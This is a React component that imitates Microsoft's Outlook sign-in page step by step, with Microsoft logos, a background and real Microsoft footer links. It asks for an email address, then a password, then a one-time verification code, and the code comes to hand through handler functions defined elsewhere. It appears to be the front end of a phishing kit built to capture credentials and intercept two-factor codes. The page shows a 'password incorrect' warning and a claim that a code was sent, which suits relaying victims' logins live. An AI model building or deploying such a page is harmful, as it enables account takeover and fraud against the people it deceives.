import React from 'react';
import { ShieldCheck } from 'lucide-react';
import './OutlookLoginPage.css';

// Microsoft logo SVG
const MicrosoftLogo = ({ size = 21 }) => (
  <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 21 21">
    <rect x="1" y="1" width="9" height="9" fill="#f25022" />
    <rect x="11" y="1" width="9" height="9" fill="#7fba00" />
    <rect x="1" y="11" width="9" height="9" fill="#00a4ef" />
    <rect x="11" y="11" width="9" height="9" fill="#ffb900" />
  </svg>
);

// Outlook envelope icon
const OutlookLogo = () => (
  <svg viewBox="0 0 32 32" width="28" height="28" xmlns="http://www.w3.org/2000/svg">
    <path d="M19.484,7.937v5.477L21.4,14.619a.489.489,0,0,0,.21,0l8.238-5.554a1.174,1.174,0,0,0-.959-1.128Z" fill="#fff" />
    <path d="M19.484,15.457l1.747,1.2a.522.522,0,0,0,.543,0c-.3.181,8.073-5.378,8.073-5.378V21.345a1.408,1.408,0,0,1-1.49,1.555H19.483V15.457Z" fill="#0078d4" />
    <path d="M10.44,12.932a1.609,1.609,0,0,0-1.42.838,4.131,4.131,0,0,0-.526,2.218A4.05,4.05,0,0,0,9.02,18.2a1.6,1.6,0,0,0,2.771.022,4.014,4.014,0,0,0,.515-2.2,4.369,4.369,0,0,0-.5-2.281A1.536,1.536,0,0,0,10.44,12.932Z" fill="#fff" />
    <path d="M2.153,5.155V26.582L18.453,30V2ZM13.061,19.491a3.231,3.231,0,0,1-2.7,1.361,3.19,3.19,0,0,1-2.64-1.318A5.459,5.459,0,0,1,6.706,16.1a5.868,5.868,0,0,1,1.036-3.616A3.267,3.267,0,0,1,10.486,11.1a3.116,3.116,0,0,1,2.61,1.321,5.639,5.639,0,0,1,1,3.484A5.763,5.763,0,0,1,13.061,19.491Z" fill="#fff" />
  </svg>
);

const Spinner = () => (
  <svg className="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" />
  </svg>
);

export default function OutlookLoginPage({
  email, password, otp, formStep,
  isSubmitting, emailError, pwWarning, otpError,
  onInputChange, onContinue, onPasswordSubmit, onOtpSubmit, onOtpChange,
  onBack, onClose, hint,
}) {
  return (
    <div className="outlook-page md:min-h-screen w-screen flex flex-col md:gap-4 items-center justify-center bg-white bg-cover md:bg-[url('/microsoft-bg.svg')]">

      <div className="w-full md:max-w-[440px] bg-white md:shadow-lg md:rounded-sm overflow-hidden relative">

        {/* Top bar */}
        <div className={"flex w-full items-center  px-8 pt-5 pb-2 " + (formStep === 1 ? "justify-between" : "justify-center")}>
          {formStep !== 1 && (
            <button
              type="button"
              onClick={onBack}
              className="text-sm text-[#0067b8] hover:underline cursor-pointer absolute left-8 top-5"
            >
              <svg className="w-5 h-5" fill="#616161" aria-hidden="true" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M10.3 19.72a1 1 0 0 0 1.4-1.43L6.33 13H20a1 1 0 0 0 0-2H6.33l5.37-5.28a1 1 0 0 0-1.4-1.42l-6.93 6.82c-.5.5-.5 1.3 0 1.78l6.92 6.83Z"></path></svg>
            </button>
          )}
          <img src="/microsoft.svg" alt="Microsoft" className='h-6 w-auto ' />
        </div>

        {/* Card body */}
        <div className="px-8 pb-8 pt-2">

          {/* Step 1 — Email */}
          {formStep === 1 && (
            <form onSubmit={onContinue}>
              <h1 className="text-[1.5rem] font-semibold text-gray-900 mb-1">Sign in</h1>

              {emailError && (
                <p className="text-sm text-red-600 mt-1">
                  This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.
                </p>
              )}

              <div className="mb-1">
                <input
                  type="text"
                  name="email"
                  id="ms-email"
                  value={email}
                  onChange={onInputChange}
                  placeholder="Email, phone, or Skype"
                  autoFocus
                  required
                  className={[
                    'w-full border-b-1 border-black/60 outline-none text-sm py-2 bg-transparent text-gray-900 placeholder-black/60 transition',
                    'focus:border-[#0067b8]',
                    emailError ? '!border-red-500' : '',
                  ].join(' ')}
                />

              </div>

              <p className="text-xs text-[#1b1b1b] mt-4">
                No account?{' '}
                <a href="#" className="cursor-pointer hover:underline">Create one!</a>
              </p>

              <p className="text-xs text-[#1b1b1b] mt-5 mb-6">
                <a href="#" className="cursor-pointer hover:underline">Can’t access your account?</a>
              </p>

              <div className="flex gap-2 justify-end">
                <button
                  type="button"
                  onClick={onClose}
                  className="inline-flex justify-center text-sm bg-black/20 text-black hover:bg-black/30 px-6 py-1.5 transition inline-flex items-center gap-2 min-w-[108px] focus:underline cursor-pointer"
                >
                  Back
                </button>

                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="inline-flex justify-center bg-[#0067b8] hover:bg-[#005ba3] focus:underline disabled:opacity-60 text-white text-sm font-medium px-6 py-1.5 transition inline-flex items-center gap-2 min-w-[108px] cursor-pointer"
                >
                  {isSubmitting ? <><Spinner />Checking…</> : 'Next'}
                </button>
              </div>
            </form>
          )}

          {/* Step 2 — Password */}
          {formStep === 2 && (
            <form onSubmit={onPasswordSubmit}>
              {/* Account chip */}
              <div className="flex justify-center mt-4">
                <div className="inline-flex w-auto items-center gap-2 border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600 mb-5">
                  {email}
                </div>
              </div>

              <h1 className="text-[24px] text-center font-semibold text-gray-900 mb-4">Enter your password</h1>

              {pwWarning && (
                <p className="text-xs text-red-600 mt-1">Your account or password is incorrect.</p>
              )}

              <div className="mb-1">
                <input
                  type="password"
                  name="password"
                  id="ms-password"
                  value={password}
                  onChange={onInputChange}
                  placeholder="Password"
                  autoFocus
                  required
                  className={[
                    'w-full border-b-1 border-black/60 outline-none text-sm py-2 bg-transparent text-gray-900 placeholder-black/60 transition',
                    'focus:border-[#0067b8]',
                    pwWarning ? '!border-red-500' : '',
                  ].join(' ')}
                />

              </div>

              <button type="button" className="text-[#0067b8] font-semibold text-[14px] mt-4 mb-6 cursor-pointer hover:underline">Forgot your password?</button>

              <div className="flex justify-between items-center">

                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="bg-[#0067b8] hover:bg-[#005ba3] disabled:opacity-60 text-white text-[14px] font-semibold inline-flex justify-center w-full rounded-sm px-6 py-2 transition items-center gap-2 cursor-pointer"
                >
                  {isSubmitting ? <><Spinner />Signing in…</> : 'Next'}
                </button>
              </div>
            </form>
          )}

          {/* Step 3 — OTP */}
          {formStep === 3 && (
            <form onSubmit={onOtpSubmit}>
              {/* Account chip */}
              <div className="flex justify-center mt-4">
                <div className="inline-flex w-auto items-center gap-2 border border-gray-300 rounded-full px-3 py-1 text-xs text-gray-600 mb-5">
                  {email}
                </div>
              </div>

              <h1 className="text-[24px] font-semibold text-center text-gray-900 mb-1">Verify your identity</h1>
              <p className="text-sm text-center text-gray-600 mb-5">
                We've sent a one-time code to your registered phone. Enter it below to continue.
              </p>


              <div className="flex justify-center mb-5">
                <img src="device_shield_checkmark.png" alt="outlook-logo" className="w-24 h-24 lg:w-40 lg:h-40" />

              </div>

              <div className="mb-1 text-center">
                <input
                  type="text"
                  id="ms-otp"
                  value={otp}
                  onChange={onOtpChange}
                  placeholder="Code"
                  inputMode="numeric"
                  autoFocus
                  required
                  className={[
                    'w-full border border-b-black/60 outline-none rounded-sm text-sm py-2 px-2 bg-transparent text-gray-900 placeholder-black/60 transition max-w-[300px] mx-auto',
                    'focus:border-b-[#0067b8] border-t-gray-200 border-x-gray-200',
                    otpError ? '!border-b-red-500' : '',
                  ].join(' ')}
                />
                {otpError && (
                  <p className="text-xs text-red-600 mt-1">{otpError}</p>
                )}
              </div>

              <div className="flex flex-col justify-center items-center mt-8">
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="bg-[#0067b8] hover:bg-[#005ba3] disabled:opacity-60 text-white text-sm font-medium px-6 py-2.5 w-full transition inline-flex items-center justify-center gap-2 rounded-sm"
                >
                  {isSubmitting ? <><Spinner />Please wait…</> : 'Next'}
                </button>

                <div className="flex gap-2 items-center text-sm mt-4">
                  <input type="checkbox" className="w-4 h-4" checked />
                  Don't ask me again on this device
                </div>
              </div>
            </form>
          )}

        </div>


      </div>

      {formStep === 1 && (
        <button type="button" className="mt-5 md:mt-0 bg-white hover:bg-gray-200 border md:border-dashed border-gray-500 py-2 border-x-0 md:border-x px-8 w-full cursor-pointer md:max-w-[440px] md:shadow-sm">
          <div className="flex items-center gap-2">
            <img src="key.svg" alt="key" className="w-8 h-8" />
            <p className="text-sm text-gray-600">Sign-in options</p>
          </div>
        </button>
      )}

      {/* Footer */}
      <div className="px-8 py-5 absolute bottom-0 text-center inset-x-auto">
        <ul className="flex gap-4 text-xs text-gray-600">
          <li><a>Help and feedback</a></li>
          <li><a className='!text-gray-600 hover:text-gray-600' href="https://www.microsoft.com/servicesagreement/">Terms of use</a></li>
          <li><a className='!text-gray-600 hover:text-gray-600' href="https://privacy.microsoft.com/en-us/">Privacy and cookies</a></li>
        </ul>
        <p className="text-[10px] text-gray-600 mt-2">Use private browsing if this is not your device. <a href="#">Learn more</a></p>
      </div>
    </div>
  );
}
